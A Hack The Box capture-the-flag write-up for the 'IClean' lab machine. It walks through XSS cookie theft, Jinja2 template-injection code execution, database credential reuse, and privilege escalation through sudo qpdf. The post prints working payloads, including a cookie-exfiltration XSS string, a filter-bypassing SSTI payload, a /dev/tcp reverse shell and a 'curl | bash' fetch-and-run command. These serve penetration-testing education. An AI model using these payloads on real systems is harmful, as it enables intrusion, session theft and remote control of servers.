<!doctype html><html lang=en><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><style>:root{--accent-color:#FF4D4D;--font-size:17.5px}</style><title>HTB: IClean</title>
<meta name=description content="Platform: Hack The Box Link: IClean Level: Medium OS: Linux IClean begins with a cleaning service website where we identify a form vulnerable to Cross-Site …"><meta name=keywords content="HackTheBox"><meta property="og:url" content="https://scorpiosec.com/posts/htb-iclean/"><meta property="og:type" content="website"><meta property="og:title" content="HTB: IClean"><meta property="og:description" content="Platform: Hack The Box Link: IClean Level: Medium OS: Linux IClean begins with a cleaning service website where we identify a form vulnerable to Cross-Site …"><meta property="og:image" content="https://scorpiosec.com/images/HTB-IClean/IClean.png"><meta property="og:image:secure_url" content="https://scorpiosec.com/images/HTB-IClean/IClean.png"><meta name=twitter:card content="summary_large_image"><meta name=twitter:title content="HTB: IClean"><meta name=twitter:description content="Platform: Hack The Box Link: IClean Level: Medium OS: Linux IClean begins with a cleaning service website where we identify a form vulnerable to Cross-Site …"><meta property="twitter:domain" content="https://scorpiosec.com/posts/htb-iclean/"><meta property="twitter:url" content="https://scorpiosec.com/posts/htb-iclean/"><meta name=twitter:image content="https://scorpiosec.com/images/HTB-IClean/IClean.png"><link rel=canonical href=https://scorpiosec.com/posts/htb-iclean/><link rel=stylesheet type=text/css href=/css/normalize.min.css media=print><link rel=stylesheet type=text/css href=/css/main.min.css><link id=dark-theme rel=stylesheet href=/css/dark.min.css><script src=/js/bundle.min.dbdc9b4541e086f12258f5155a48310ed9f06d931aacfe9b7c85f8699b1f5cb2.js integrity="sha256-29ybRUHghvEiWPUVWkgxDtnwbZMarP6bfIX4aZsfXLI="></script></head><body><script>setThemeByUserPref()</script><header class=header><nav class=header-nav><div class=avatar><a href=https://scorpiosec.com/><img src=/redscorpio.jpg alt=avatar></a></div><div class=nav-title><a class=nav-brand href=https://scorpiosec.com/>Scorpiosec</a></div><div class=nav-links><div class=nav-link><a href=https://scorpiosec.com/posts/ aria-label><span data-feather=book></span> Posts</a></div><div class=nav-link><a href=https://scorpiosec.com/projects/ aria-label><span data-feather=code></span> Projects</a></div><div class=nav-link><a href=https://scorpiosec.com/tags/ aria-label><span data-feather=tag></span> Tags</a></div><div class=nav-link><a href=https://scorpiosec.com/categories/ aria-label><span data-feather=folder></span> Categories</a></div><div class="nav-link language-switcher"><a href=/fr/posts/htb-iclean/>Français</a></div><span class=nav-icons-divider></span><div class="nav-link dark-theme-toggle"><span class="sr-only dark-theme-toggle-screen-reader-target">theme</span>
<a aria-hidden=true role=switch><span class=theme-toggle-icon data-feather=moon></span></a></div><div class=nav-link id=hamburger-menu-toggle><span class="sr-only hamburger-menu-toggle-screen-reader-target">menu</span>
<a aria-checked=false aria-labelledby=hamburger-menu-toggle id=hamburger-menu-toggle-target role=switch><span data-feather=menu></span></a></div><ul class="nav-hamburger-list visibility-hidden"><li class=nav-item><a href=https://scorpiosec.com/posts/><span data-feather=book></span> Posts</a></li><li class=nav-item><a href=https://scorpiosec.com/projects/><span data-feather=code></span> Projects</a></li><li class=nav-item><a href=https://scorpiosec.com/tags/><span data-feather=tag></span> Tags</a></li><li class=nav-item><a href=https://scorpiosec.com/categories/><span data-feather=folder></span> Categories</a></li><li class="nav-item dark-theme-toggle"><span class="sr-only dark-theme-toggle-screen-reader-target">theme</span>
<a role=switch><span class=theme-toggle-icon data-feather=moon></span></a></li></ul></div></nav></header><main id=content><div class="post container"><div class=post-header-section><h1>HTB: IClean</h1><small role=doc-subtitle></small><p class=post-date>6 min read |
<span class=post-date>August 1, 2024</span></p><ul class=post-tags><li class=post-tag><a href=https://scorpiosec.com/tags/hackthebox>HackTheBox</a></li></ul></div><div class=post-content><ul><li>Platform: Hack The Box</li><li>Link: <a href=https://app.hackthebox.com/machines/IClean>IClean</a></li><li>Level: Medium</li><li>OS: Linux</li></ul><hr><p>IClean begins with a cleaning service website where we identify a form vulnerable to Cross-Site Scripting (XSS). Exploiting this vulnerability, we retrieve a session cookie and access the application dashboard. There, we discover an invoice generator susceptible to Server-Side Template Injection (SSTI), which provides our initial foothold. Further exploration reveals the database credentials, allowing us to recover password hashes. By cracking one of these hashes, we gain SSH access and retrieve the user flag. To obtain the root flag, we must exploit qpdf, and this write-up will demonstrate two different methods to achieve this.</p><p>Target IP address - <code>10.10.11.12</code></p><h2 id=scanning>Scanning</h2><pre tabindex=0><code>nmap -sC -sV -oA nmap/IClean 10.10.11.12
</code></pre><p><strong>Results</strong></p><div class=highlight><pre tabindex=0 style=color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>Starting Nmap 7.94SVN <span style=color:#56b6c2>(</span> https://nmap.org <span style=color:#56b6c2>)</span> at 2024-04-08 12:02 CDT
</span></span><span style=display:flex><span>Nmap scan report <span style=color:#c678dd>for</span> 10.129.43.201
</span></span><span style=display:flex><span>Host is up <span style=color:#56b6c2>(</span>0.077s latency<span style=color:#56b6c2>)</span>.
</span></span><span style=display:flex><span>Not shown: <span style=color:#d19a66>998</span> closed tcp ports <span style=color:#56b6c2>(</span>conn-refused<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>PORT   STATE SERVICE VERSION
</span></span><span style=display:flex><span>22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 <span style=color:#56b6c2>(</span>Ubuntu Linux; protocol 2.0<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>| ssh-hostkey: 
</span></span><span style=display:flex><span>|   <span style=color:#d19a66>256</span> 2c:f9:07:77:e3:f1:3a:36:db:f2:3b:94:e3:b7:cf:b2 <span style=color:#56b6c2>(</span>ECDSA<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>|_  <span style=color:#d19a66>256</span> 4a:91:9f:f2:74:c0:41:81:52:4d:f1:ff:2d:01:78:6b <span style=color:#56b6c2>(</span>ED25519<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>80/tcp open  http    Apache httpd 2.4.52 <span style=color:#56b6c2>((</span>Ubuntu<span style=color:#56b6c2>))</span>
</span></span><span style=display:flex><span>|_http-server-header: Apache/2.4.52 <span style=color:#56b6c2>(</span>Ubuntu<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>|_http-title: Site doesn&#39;t have a title <span style=color:#56b6c2>(</span>text/html<span style=color:#56b6c2>)</span>.
</span></span><span style=display:flex><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span style=display:flex><span>Nmap <span style=color:#c678dd>done</span>: <span style=color:#d19a66>1</span> IP address <span style=color:#56b6c2>(</span><span style=color:#d19a66>1</span> host up<span style=color:#56b6c2>)</span> scanned in 10.33 seconds
</span></span></code></pre></div><p>We find two open ports 22 (SSH) and 80 (HTTP - Apache)</p><p>We get redirected to <code>capiclean.htb</code> when trying to access the web server. We need to add it to the <code>/etc/hosts</code> file to access the website.</p><pre tabindex=0><code>sudo echo &#34;10.10.11.12 capiclean.htb&#34; | sudo tee -a /etc/hosts
</code></pre><h2 id=enumeration>Enumeration</h2><p>The web application is a cleaning service.</p><p><img src=/images/HTB-IClean/capiclean.png alt="IClean website"></p><p>After looking around we found two functionalities that we may be able to exploit.</p><ul><li><code>http://capiclean.htb/quote</code> (using the <code>GET A QUOTE</code> button) leads us to a form where we can select which services we desire and also input an email address.</li></ul><p><img src=/images/HTB-IClean/capiclean-quote.png alt="capiclean quote"></p><p>After submitting an email address we get to <code>http://capiclean.htb/sendMessage</code>.</p><p><img src=/images/HTB-IClean/capiclean-quote2.png alt="capiclean quote thank you message"></p><ul><li><code>http://capiclean.htb/login</code> leads to a login form with the usual username:password credentials.</li></ul><p><img src=/images/HTB-IClean/capiclean-login.png alt="capiclean login"></p><p>Running gobuster we find <code>/dashboard</code> but we get redirected to the Home page when we try to access it probably because we don&rsquo;t have a valid cookie.</p><pre tabindex=0><code>gobuster dir -u http://capiclean.htb/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
</code></pre><p><img src=/images/HTB-IClean/gobuster.png alt="directory brute forcing"></p><p>We intercept the request we get after submitting the email at <code>/quote</code>, since there is a login feature but no sign in it button let&rsquo;s try to steal a session cookie in order to gain access the other pages.</p><p><img src=/images/HTB-IClean/quote-request.png alt="Request intercepted"></p><p>Now we use our payload before sending the request.</p><p><img src=/images/HTB-IClean/XSS-cookie-steal.png alt="XSS cookie steal"></p><p><strong>XSS Payload</strong></p><pre tabindex=0><code>&lt;img+src%3dx+onerror%3dthis.src%3d&#34;http%3a//&lt;IP_ADDRESS&gt;%3a&lt;PORT_NUMBER&gt;/cookie.php&#34;%2bbtoa(document.cookie)&gt;
</code></pre><p>We get the base64 cookie value.</p><p><img src=/images/HTB-IClean/base64-cookie.png alt="base64 cookie value"></p><p><strong>Base64 cookie value</strong></p><pre tabindex=0><code>c2Vzc2lvbj1leUp5YjJ4bElqb2lNakV5TXpKbU1qazNZVFUzWVRWaE56UXpPRGswWVRCbE5HRTRNREZtWXpNaWZRLlpoSGZEUS5HNXJKMEhWdkJwaGFjcHIxR3pJbTlwaFFYanM=
</code></pre><p>We use the command below to decode it.</p><pre tabindex=0><code>echo &#39;COOKIE_VALUE&#39; | base64 -d
</code></pre><p><img src=/images/HTB-IClean/COOKIE-value.png alt="cookie value decoded"></p><p>After adding it to our browser, we are able to access <code>/dashboard</code>.</p><p><img src=/images/HTB-IClean/capiclean-dashboard.png alt="IClean dashboard"></p><p>In <code>Generate Invoice</code> we can fill the form and get an <code>Invoice ID</code>.</p><p><img src=/images/HTB-IClean/invoice-generator.png alt="IClean invoice generator"></p><p><img src=/images/HTB-IClean/Invoice-ID.png alt="IClean invoice ID"></p><p>Using that ID in <code>Generate QR</code> will create a QR code link, submitting that link allows us to see our invoice document.</p><p><img src=/images/HTB-IClean/Generate-QR.png alt="IClean Generate QR code"></p><p><img src=/images/HTB-IClean/Invoice-doc.png alt="IClean Invoce document"></p><h2 id=initial-foothold>Initial Foothold</h2><p>The application is clearly using some template engine to create the invoice documents which means it might be vulnerable to <code>Server Side Template Injection (SSTI)</code>. The thing is we need to find which template engine is being used.</p><p>Using <code>Wappalyzer</code> I identify that the application is using <code>Flask</code> and we know that the commonly used template engines for Python are Jinja2, Mako, Genshi and Cheetah.</p><p><img src=/images/HTB-IClean/wappalyzer.png alt="IClean wapplayzer"></p><p>This <a href=https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#jinja2-python>HackTricks</a> page has various payloads to test for SSTI and identify the specific template used.</p><p>We confirm that <code>Jinja2</code> is being used by using the payload <code>{{config}}</code> which returns the server&rsquo;s configuration. Now we just need to find the right payload to execute our commands on the server.</p><p><img src=/images/HTB-IClean/SSTI-test.png alt="SSTI test"></p><p><img src=/images/HTB-IClean/SSTI-test2.png alt="SSTI test results"></p><p>After numerous fails I found a working payload on <a href=https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection/jinja2-ssti#filter-bypasses>hacktricks</a>.</p><pre tabindex=0><code>{%25with+a%3drequest|attr(&#34;application&#34;)|attr(&#34;\x5f\x5fglobals\x5f\x5f&#34;)|attr(&#34;\x5f\x5fgetitem\x5f\x5f&#34;)(&#34;\x5f\x5fbuiltins\x5f\x5f&#34;)|attr(&#39;\x5f\x5fgetitem\x5f\x5f&#39;)(&#39;\x5f\x5fimport\x5f\x5f&#39;)(&#39;os&#39;)|attr(&#39;popen&#39;)(&#39;ls${IFS}-l&#39;)|attr(&#39;read&#39;)()%25}{%25print(a)%25}{%25endwith%25}
</code></pre><p><img src=/images/HTB-IClean/SSTI-payload.png alt="SSTI payload"></p><p>The next step is to prompt the server to run our reverse shell. To do this, we’ll establish a Python server on our local machine and set up a listener on a port of our choosing. This will allow us to receive incoming connections from the reverse shell.</p><p>Below is the content of my reverse shell file.</p><pre tabindex=0><code>#!/bin/bash

sh -i &gt;&amp; /dev/tcp/IP_ADDRESS/PORT_NUMBER 0&gt;&amp;1
</code></pre><blockquote><p>The reverse shell is inside the <code>revshell.sh</code> file. After we send the request containing our payload, the server fetches it from our python server and executes it.</p></blockquote><pre tabindex=0><code>{%25with+a%3drequest|attr(&#34;application&#34;)|attr(&#34;\x5f\x5fglobals\x5f\x5f&#34;)|attr(&#34;\x5f\x5fgetitem\x5f\x5f&#34;)(&#34;\x5f\x5fbuiltins\x5f\x5f&#34;)|attr(&#39;\x5f\x5fgetitem\x5f\x5f&#39;)(&#39;\x5f\x5fimport\x5f\x5f&#39;)(&#39;os&#39;)|attr(&#39;popen&#39;)(&#39;curl+http%3a//&lt;IP_ADDRESS&gt;%3a&lt;PORT_NUMBER&gt;/revshell.sh+|+bash&#39;)|attr(&#39;read&#39;)()%25}{%25print(a)%25}{%25endwith%25}
</code></pre><p>We get a shell as <code>www-data</code>.</p><p><img src=/images/HTB-IClean/foothold.png alt="IClean foothold"></p><h2 id=privilege-escalation>Privilege Escalation</h2><p>In <code>/home</code> we are unable to access the directory <code>consuela</code>.</p><p><img src=/images/HTB-IClean/consuella-denied.png alt="IClean access denied"></p><p>Looking around we find some database credentials in <code>opt/app/app.py</code>.</p><p><img src=/images/HTB-IClean/db-credentials.png alt="IClean database credentials"></p><p>After running <code>ss -lntp</code> we see a service running on port 3306 which is <code>MySQL</code> default port.</p><p><img src=/images/HTB-IClean/services.png alt="IClean internal services"></p><p>We connect to the database with <code>iclean:pxCsmnGLckUb</code></p><pre tabindex=0><code>mysql -u iclean -p
</code></pre><p>In the <code>capiclean</code> database we find a table called <code>users</code> which contains the password hash for the user <code>consuela</code>.</p><p><img src=/images/HTB-IClean/users-table.png alt="IClean database users table"></p><p>Using <a href=https://crackstation.net/>crackstation</a> we get the user password which is <code>simple and clean</code>.</p><p><img src=/images/HTB-IClean/hash-cracked.png alt="password hash cracked"></p><blockquote><p>The spaces are also part of the password.</p></blockquote><p>With the credentials <code>consuela:simple and clean</code> we login via SSH and retrieve the user flag <code>user.txt</code></p><p><img src=/images/HTB-IClean/user-flag.png alt="user flag"></p><p><code>sudo -l</code> reveals that the user can run <code>/usr/bin/qpdf</code> as root.</p><p><img src=/images/HTB-IClean/sudo-l.png alt="sudo -l command"></p><p>Going through the documentation for <a href=https://qpdf.readthedocs.io/en/stable/cli.html#option-add-attachment>qpdf</a> we find that <code>--add-attachment</code> can be used to add attachments to a file.</p><p>From here we have two ways to get the root flag. We can grab the root SSH key by attaching it to a pdf file and login as the root user or we can directly attach the root flag (because it is simply a .txt file) to a pdf file, open it in a document viewer and read the flag.</p><h3 id=first-method>First method</h3><p>First we attach the SSH key for the root user to a pdf file, connect as the root user via SSH and grab the root flag.</p><pre tabindex=0><code>sudo /usr/bin/qpdf --empty /tmp/root.pdf --qdf --add-attachment /root/.ssh/id_rsa --
</code></pre><p>The SSH key is in the output of the file. We only need to do <code>cat root.pdf</code> to get the SSH private key for the root user.</p><p><img src=/images/HTB-IClean/root-ssh-key.png alt="root ssh key"></p><p>We copy it to our local machine and make sure to change the permission with <code>chmod 600</code>. We can then login as root via ssh.</p><pre tabindex=0><code>ssh root@capiclean.htb -i id_rsa
</code></pre><p><img src=/images/HTB-IClean/root-flag.png alt="root flag"></p><h3 id=second-method>Second method</h3><p>For this method we upload a dummy pdf on the target and we attach the root flag to it.</p><pre tabindex=0><code>sudo /usr/bin/qpdf --add-attachment /root/root.txt -- dummy.pdf root2.pdf
</code></pre><p>We download the output file <code>root2.pdf</code> in this example. I used the default document viewer on my Kali VM. Click on the scrolling menu in the upper-left corner and choose <code>Attachments</code>.</p><p><img src=/images/HTB-IClean/pdf-attachment.png alt="PDF Viewer Attachments"></p><p>Double click <code>root.txt</code> and it will reveal the root flag.</p><p><img src=/images/HTB-IClean/root-flag2.png alt="root.txt file"></p><h2 id=closing-words>Closing Words</h2><p>This box was easily one of my favorite on the platform, I like how inovative it was with the vulnerability chain. If you&rsquo;d like to learn more about the web vulnerabilities featured on this box, you can do so on TryHackMe where they have some rooms focused on them (this not an exhaustive list).</p><p>XSS -> <a href=https://tryhackme.com/r/room/axss>XSS</a> and <a href=https://tryhackme.com/r/room/xss>Intro to Cross-site Scripting</a></p><p>SSTI -> <a href=https://tryhackme.com/r/room/serversidetemplateinjection>Server-side Template Injection</a> and <a href=https://tryhackme.com/r/room/learnssti>SSTI</a></p><p>For a more structured path, you can check PortSwigger academy (totally free) <a href=https://portswigger.net/web-security/all-topics>here</a>, they cover all those web vulnerabilities and more.</p></div><div class=prev-next><div class=prev-post><p><a href=/posts/htb-headless/>&#8592;
Previous:
HTB: Headless</a></p><p class=prev-post-date>July 19, 2024</p></div><div class=next-post><p><a href=/posts/htb-runner/>Next:
HTB: Runner
&#8594;</a></p><p class=next-post-date>August 22, 2024</p></div></div><svg id="btt-button" class="arrow-logo" xmlns="http://www.w3.org/2000/svg" height="1em" viewBox="0 0 384 512" onclick="scrollToTop()" title="Go to top"><path d="M177 159.7l136 136c9.4 9.4 9.4 24.6.0 33.9l-22.6 22.6c-9.4 9.4-24.6 9.4-33.9.0L160 255.9l-96.4 96.4c-9.4 9.4-24.6 9.4-33.9.0L7 329.7c-9.4-9.4-9.4-24.6.0-33.9l136-136c9.4-9.5 24.6-9.5 34-.1z"/></svg>
<script>let backToTopButton=document.getElementById("btt-button");window.onscroll=function(){scrollFunction()};function scrollFunction(){document.body.scrollTop>20||document.documentElement.scrollTop>20?backToTopButton.style.display="block":backToTopButton.style.display="none"}function scrollToTop(){window.scrollTo(0,0)}</script></div><aside class=post-toc><nav id=toc><nav id=TableOfContents><ul><li><ul><li><a href=#scanning>Scanning</a></li><li><a href=#enumeration>Enumeration</a></li><li><a href=#initial-foothold>Initial Foothold</a></li><li><a href=#privilege-escalation>Privilege Escalation</a><ul><li><a href=#first-method>First method</a></li><li><a href=#second-method>Second method</a></li></ul></li><li><a href=#closing-words>Closing Words</a></li></ul></li></ul></nav></nav></aside></main><footer class=footer><span>&copy; 2024 K-Scorpio</span>
<span>Made with &#10084;&#65039; using <a target=_blank href=https://github.com/gokarna-theme/gokarna-hugo>Gokarna</a></span></footer></body></html>